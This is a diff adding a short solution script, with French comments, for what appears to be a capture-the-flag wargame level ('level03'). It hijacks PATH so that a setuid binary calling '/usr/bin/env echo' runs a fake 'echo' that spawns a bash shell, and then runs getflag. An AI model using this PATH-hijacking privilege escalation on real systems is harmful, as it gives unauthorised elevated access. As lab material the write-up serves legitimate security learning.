@@ -1,0 +1,10 @@
+# On observe avec "strings level03" que le programe appel "/usr/bin/env echo Exploit me"
+# On va donc changer le PATH pour executer notre programe echo a la place du vrai echo (/bin/echo)
+
+mkdir /tmp/level03
+echo "/bin/bash" > /tmp/level03/echo
+chmod +x /tmp/level03/echo
+bash
+PATH="/tmp/level03"
+./level03
+/bin/getflag
